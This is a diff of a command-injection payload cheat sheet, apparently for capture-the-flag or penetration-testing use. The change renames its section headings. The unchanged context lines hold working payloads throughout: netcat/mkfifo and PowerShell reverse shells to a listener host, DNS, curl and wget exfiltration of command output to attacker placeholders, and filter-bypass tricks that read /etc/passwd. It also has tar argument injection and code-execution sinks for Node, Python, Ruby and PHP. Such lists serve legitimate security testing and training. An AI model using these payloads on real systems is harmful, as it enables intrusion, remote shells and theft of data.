@@ -6,7 +6,7 @@
 
 ---
 
-## CMDi - Basic Separators
+## inject command separators
 Common command chaining operators.
 
 ```bash
@@ -23,7 +23,7 @@ echo "\`id\`"
 
 ---
 
-## CMDi - Reverse Shell via &&
+## reverse shell via &&
 Chain after a known-good IP/hostname.
 
 ```bash
@@ -34,7 +34,7 @@ echo "8.8.8.8 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {{LHOST
 
 ---
 
-## CMDi - Reverse Shell via ;
+## reverse shell via semicolon
 Statement-terminator chain.
 
 ```bash
@@ -45,7 +45,7 @@ echo "8.8.8.8 ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {{LHOST:
 
 ---
 
-## CMDi - Reverse Shell via ||
+## reverse shell via ||
 Run on failure (when first cmd errors).
 
 ```bash
@@ -56,7 +56,7 @@ echo "8.8.8.8 || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {{LHOST
 
 ---
 
-## CMDi - URL Encoded
+## inject command url encoded
 Encode separators when web filter blocks them.
 
 ```bash
@@ -67,7 +67,7 @@ echo "8.8.8.8%20%26%26%20id"
 
 ---
 
-## CMDi - Blind via Time Delay
+## command injection blind time based
 Confirm CMDi when output is suppressed.
 
 ```bash
@@ -79,7 +79,7 @@ echo "& ping -c 5 127.0.0.1"
 
 ---
 
-## CMDi - Blind via DNS Exfil
+## command injection blind dns exfil
 Exfil data via DNS lookup callback.
 
 ```bash
@@ -91,7 +91,7 @@ echo "; \$(whoami).{{ATTACKER_DOMAIN:domain:attacker.com}}"
 
 ---
 
-## CMDi - Bypass Space Filter
+## bypass space filter IFS
 When spaces are blocked use IFS, ${IFS}, tab, or brace.
 
 ```bash
@@ -104,7 +104,7 @@ echo "cat\$IFS\$9/etc/passwd"
 
 ---
 
-## CMDi - Bypass Slash Filter
+## bypass slash filter
 Use $PATH or wildcards to construct paths.
 
 ```bash
@@ -115,7 +115,7 @@ echo "cat\${PATH:0:1}etc\${PATH:0:1}passwd"
 
 ---
 
-## CMDi - Bypass Keyword Filter
+## bypass keyword filter blacklist
 Split keywords to bypass blacklists.
 
 ```bash
@@ -129,7 +129,7 @@ echo "wh''oami"
 
 ---
 
-## CMDi - Read File Contents
+## read file via injection
 Extract any readable file via injection.
 
 ```bash
@@ -141,7 +141,7 @@ echo "; cat \$(find / -name flag.txt 2>/dev/null)"
 
 ---
 
-## CMDi - Curl Out-of-Band
+## exfil output curl out of band
 Send command output to attacker.
 
 ```bash
@@ -152,7 +152,7 @@ echo "; curl http://{{LHOST:ip}}:{{LPORT:port:8000}}/?d=\$(id|base64)"
 
 ---
 
-## CMDi - Wget OOB
+## exfil output wget OOB
 Same idea via wget.
 
 ```bash
@@ -163,7 +163,7 @@ echo "; wget http://{{LHOST:ip}}:{{LPORT:port:8000}}/?d=\$(whoami)"
 
 ---
 
-## CMDi - Windows Reverse Shell
+## windows reverse shell powershell
 PowerShell reverse shell payload.
 
 ```bash
@@ -174,7 +174,7 @@ echo "& powershell -nop -c \"\$client=New-Object System.Net.Sockets.TCPClient('{
 
 ---
 
-## CMDi - Windows Base64 PowerShell
+## windows base64 powershell payload
 Encoded PowerShell to evade quoting issues.
 
 ```bash
@@ -186,7 +186,7 @@ echo "& powershell -e {{B64:str:JABjAGwAaQBlAG4AdAAg...}}"
 
 ---
 
-## CMDi - Windows: Multiple Separators
+## inject command windows separators
 Windows-specific separators.
 
 ```bash
@@ -201,7 +201,7 @@ echo "%0a whoami"
 
 ---
 
-## CMDi - Argument Injection (no separator)
+## argument injection no separator
 Abuse arg parsing when separators filtered.
 
 ```bash
@@ -213,7 +213,7 @@ echo "--checkpoint-action=shell_run='id'"
 
 ---
 
-## CMDi - Curl URL with Embedded Cmd
+## inject command via curl url rce
 Useful for HTB-style RCE chains.
 
 ```bash
@@ -225,7 +225,7 @@ curl -s "{{URL:url:http://target.htb/files/s.php?c=}}bash%20-c%20%27bash%20-i%20
 
 ---
 
-## CMDi - Node.js Backtick / Template Literal
+## node template literal RCE
 Trigger Node template literal sink.
 
 ```bash
@@ -236,7 +236,7 @@ echo "\${require('child_process').execSync('id')}"
 
 ---
 
-## CMDi - Python Sink
+## python eval sink RCE
 String reaches eval/run sink.
 
 ```bash
@@ -247,7 +247,7 @@ echo "__import__('os').system('id')"
 
 ---
 
-## CMDi - Ruby Backtick
+## ruby backtick RCE
 Ruby backtick command run.
 
 ```bash
@@ -259,7 +259,7 @@ echo "system('id')"
 
 ---
 
-## CMDi - PHP Sink
+## php system passthru sink RCE
 PHP system / passthru / shell_exec sinks.
 
 ```bash
